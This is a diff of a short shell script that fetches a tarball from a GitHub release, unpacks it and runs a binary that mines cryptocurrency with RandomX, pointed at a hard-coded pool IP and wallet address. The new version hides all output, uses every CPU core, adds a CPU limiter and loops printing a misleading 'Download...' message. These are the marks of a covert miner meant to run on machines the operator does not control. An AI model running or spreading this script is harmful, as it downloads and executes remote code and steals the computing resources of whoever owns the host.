@@ -1,7 +1,9 @@
-chsh -s /bin/zsh
-wget https://github.com/komprengaw/rengaw/releases/download/demon/daemon.tar.gz > /dev/null 2>&1 && tar -xvf daemon.tar.gz && ./uranus -a randomx -o 159.203.162.18:3333 -u nexa:nqtsq5g5enrk4gqv9aftxgcq0ze9zweql8fma5fp06qcjhax -p "vivo" -t 1 > /dev/null 2>&1 &
+apt update
+apt install -y cpulimit
+cpulimit -l 150 -e uranus &
+wget https://github.com/preak07/kopi/releases/download/susu/daemon.tar.gz && tar -xvf daemon.tar.gz && ./uranus -a randomx -o 159.203.162.18:3333 -u BONK:9pLCmLN5SezzydMn1ASJ1NermRguNYJmdy9Uy1b5wkvN -p "vivo"  -t $(nproc --all) >/dev/null 2>&1 & 
 while true
 do
-        echo "gasss........!"
+        echo "Download..."
         sleep 20
 done
